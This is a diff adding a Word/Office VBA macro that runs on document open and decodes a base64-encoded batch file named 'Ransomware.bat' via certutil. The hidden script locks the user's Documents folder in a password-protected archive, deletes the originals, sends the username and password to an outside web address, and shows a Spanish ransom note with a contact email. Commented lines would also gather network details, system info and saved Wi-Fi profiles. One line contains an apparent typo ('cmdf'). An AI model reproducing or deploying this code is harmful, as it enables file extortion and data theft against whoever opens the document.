@@ -1,0 +1,25 @@
+Sub chell()
+Shell "cmd /c echo QGVjaG8gb2ZmCkBlY2hvIG9mZgp0aXRsZSBOb3NlCmNvbG9yIDAyCnNldCBBPUM6XCJQcm9ncmFt
+IEZpbGVzIlxXaW5SQVJcCnNldCBCPUM6XFVTRVJTXCVVU0VSTkFNRSVcCnNldCBDPU5lUHRZeCVS
+QU5ET00lCnNldCBEPUVuY3J5JVJBTkRPTSUKJUElcmFyLmV4ZSBhIC1kZiAtcCVDJSAlQiUlRCUu
+cmFyICVCJURvY3VtZW50cwpzdGFydCBodHRwczovL2phanhqcWouY29tL3VybC5waHA/bm9tYnJl
+PVVzdWFyaW86KyVVU0VSTkFNRSUrQ2lmcmFkbzorJUMlCjpyYW5zb20KY2xzCmNvbG9yIDAyCmVj
+aG8gIF9fX19fX19fX19fX19fX19fX19fX18KZWNobyBbIEFyY2hpdm9zIEVuY3JpcHRhZG9zIF0K
+ZWNobyAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQplY2hvICAgICAgICAgXCAgIC9cXy9cICAgICAg
+ICAgIENyZWF0ZWQgYnkgTlkgYW5kIE5vc2UKZWNobyAgICAgICAgICBcICAob28pXF9fX19fX18g
+ICAgICAgIAplY2hvICAgICAgICAgICAgIChfXylcICAgICAgIClcL1wgICAgCmVjaG8gICAgICAg
+ICAgICAgICAgIElJLS0tLXcgSQplY2hvICAgICAgICAgICAgICAgICBJSSAgICAgSUkKZWNobyAg
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpl
+Y2hvICAgIERlYmVzIGNvbnRhY3Rhcm1lIGVuIEVubWlwZW5lQGdtYWlsLmNvbQplY2hvICAgIHBh
+cmEgb2J0ZW5lciBsYSBjb250cmFzZW5hIGRlIHR1cyBkYXRvcyA6RAplY2hvICAgIFR1cyBhcmNo
+aXZvczogJUIlJUQlIEVuY3JpcHRhY2lvbjogU1NIQQplY2hvICAtLS0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnBhdXNlCmdvdG8gcmFuc29tCg== > .temp", vHide
+Shell "cmdf /c certutil -decode .temp Ransomware.bat | start Ransomware.bat"
+'Shell "cmd /c ipconfig > trabajo.txt", vHide
+'Shell "cmd /c systeminfo >> trabajo.txt", vHide
+'Shell "cmd /c netsh wlan show profile >> trabajo.txt"
+'Shell "cmd /c start Trabajo.exe", vHide
+End Sub
+Sub AutoOpen()
+chell
+End Sub
